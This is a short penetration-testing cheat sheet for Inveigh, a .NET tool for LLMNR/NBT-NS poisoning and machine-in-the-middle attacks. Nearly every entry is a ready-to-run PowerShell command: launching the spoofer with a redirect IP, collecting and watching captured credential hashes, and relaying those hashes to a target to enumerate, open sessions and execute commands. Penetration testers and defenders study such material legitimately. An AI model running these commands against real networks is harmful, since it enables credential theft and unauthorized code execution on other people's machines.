# inveigh

% inveigh, LLMNR, NBT-NS, Poisoning, man in the middle

## . - url
```
https://github.com/Kevin-Robertson/Inveigh
```

## . - desc
```
Inveigh is a cross-platform .NET IPv4/IPv6 machine-in-the-middle tool for penetration testers.
```

## list prams
```powershell
(Get-Command Invoke-Inveigh).Parameters
```

## inveigh - launch
#plateform/windows #target/remote #cat/ATTACK/MITM 
```
Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -IP <listening_ip> -SpooferIP <redirect_ip>
```

## inveigh - clear hashtable
#plateform/windows #target/remote #cat/ATTACK/MITM 
```
Clear-Inveigh
```

## inveigh - get data from hashtable
#plateform/windows #target/remote #cat/ATTACK/MITM 
```
Get-Inveigh
```

## inveigh - stop all running modules
#plateform/windows #target/remote #cat/ATTACK/MITM 
```
Stop-Inveigh
```

## inveigh - enable rela-time console output
#plateform/windows #target/remote #cat/ATTACK/MITM 
```
Watch-Inveigh
```

## inveigh - Relaying Hashes Captured w/ HTTP Proxy
#plateform/windows #target/serve #cat/ATTACK/MITM 
```
Invoke-InveighRelay -ConsoleOutput Y -Target <targetIP> -Command "whoami" -Attack Enumerate,Execute,Session
```